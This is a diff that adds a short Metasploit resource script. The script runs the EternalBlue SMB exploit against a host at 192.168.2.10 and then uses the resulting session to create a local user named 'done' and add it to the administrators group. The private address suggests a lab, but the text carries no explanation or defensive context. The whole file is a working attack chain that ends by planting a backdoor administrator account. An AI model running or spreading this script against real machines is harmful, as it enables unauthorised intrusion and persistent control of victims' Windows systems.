@@ -1,0 +1,7 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.2.10
+set LPORT 4444
+exploit -z
+sessions -c 'net user /add "done" "done"' -i 1
+sessions -c 'net localgroup administrators "done" /add' -i 1
+sessions -K
